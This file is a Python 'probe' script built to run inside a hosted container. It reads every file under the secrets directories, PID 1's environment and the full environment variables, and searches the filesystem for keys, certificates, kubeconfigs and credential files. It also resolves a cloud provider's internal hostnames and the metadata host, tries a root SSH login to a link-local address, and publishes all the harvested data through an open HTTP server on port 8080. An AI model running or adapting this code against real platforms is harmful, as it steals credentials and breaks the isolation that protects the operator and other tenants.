import http.server
import urllib.request
import json
import os
import socket
import ssl
import subprocess

results = {}

def run_cmd(name, cmd, timeout=5):
    try:
        r = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout, shell=isinstance(cmd, str))
        results[name] = {"stdout": r.stdout[:4000], "stderr": r.stderr[:500]}
    except Exception as e:
        results[name] = {"error": str(e)}

def read_file(name, path):
    try:
        with open(path, 'rb') as f:
            data = f.read(4000)
            try:
                results[name] = data.decode('utf-8')
            except:
                results[name] = data.hex()[:4000]
    except Exception as e:
        results[name] = str(e)

# 1. SECRETS - enumerate and read everything in /secrets and /run/secrets
run_cmd("ls_secrets", "find /secrets -type f 2>/dev/null | head -50")
run_cmd("ls_run_secrets", "find /run/secrets -type f 2>/dev/null | head -50")
run_cmd("ls_var_run_secrets", "find /var/run/secrets -type f 2>/dev/null | head -50")

# Read all files in /secrets
run_cmd("cat_secrets", "find /secrets -type f -exec sh -c 'echo \"=== {} ===\"; cat \"{}\" 2>&1; echo' \; 2>/dev/null | head -200")
run_cmd("cat_run_secrets", "find /run/secrets -type f -exec sh -c 'echo \"=== {} ===\"; cat \"{}\" 2>&1; echo' \; 2>/dev/null | head -200")

# 2. .containerenv
read_file("containerenv", "/run/.containerenv")

# 3. Full mount info
read_file("mountinfo", "/proc/self/mountinfo")

# 4. Check for any interesting files in standard locations
run_cmd("find_interesting", """find / -maxdepth 5 \( \
    -name '*.pem' -o -name '*.key' -o -name '*.crt' -o -name '*.cert' \
    -o -name 'kubeconfig' -o -name '.kube' -o -name 'ca-bundle*' \
    -o -name 'service_account*' -o -name '*.env' -o -name '.env*' \
    -o -name 'credentials' -o -name 'config.json' \
    -o -name 'application.yml' -o -name 'application.yaml' \
    -o -name 'bootstrap.yml' \) \
    2>/dev/null | grep -v '/usr/lib/\|/etc/ssl/certs/\|/usr/share/' | head -30""")

# 5. Check /proc/1 for main process info
run_cmd("proc1_cmdline", "cat /proc/1/cmdline | tr '\\0' ' '")
run_cmd("proc1_environ", "cat /proc/1/environ 2>/dev/null | tr '\\0' '\\n' | head -50")

# 6. List ALL processes
run_cmd("processes", "ps auxww 2>/dev/null || cat /proc/[0-9]*/cmdline 2>/dev/null | tr '\\0' ' '")

# 7. Network sockets
run_cmd("ss_all", "ss -tlnp 2>/dev/null || netstat -tlnp 2>/dev/null")

# 8. Check sidecar container via shared namespace
run_cmd("proc_list", "ls -la /proc/ 2>/dev/null | grep '^d' | head -30")

# 9. Environment variables (ALL, including sensitive)
# This is our own container, checking for platform-injected secrets
results["all_env"] = dict(os.environ)

# 10. Check /etc for config files
run_cmd("etc_files", "ls -la /etc/ 2>/dev/null | head -40")

# 11. Check if we can see other containers' filesystem via /proc
run_cmd("proc_mounts", "cat /proc/self/mounts 2>/dev/null | head -30")

# 12. DNS resolution for internal services
run_cmd("dig_tests", """
for h in \
    metadata.google.internal \
    api.aiven.io \
    console.aiven.io \
    internal.aiven.io \
    control.aiven.io \
    admin.aiven.io \
    management.aiven.io; do
    result=$(dig +short "$h" 2>/dev/null)
    echo "$h: $result"
done
""")

# 13. Try to access host SSH with known default approaches
run_cmd("ssh_test", "ssh -o StrictHostKeyChecking=no -o ConnectTimeout=2 -o BatchMode=yes root@169.254.1.2 whoami 2>&1 | head -5")

class Handler(http.server.BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.send_header('Content-Type', 'application/json')
        self.end_headers()
        self.wfile.write(json.dumps(results, indent=2, default=str).encode())
    def log_message(self, *args):
        pass

print("Starting probe v4 on port 8080...")
http.server.HTTPServer(('0.0.0.0', 8080), Handler).serve_forever()
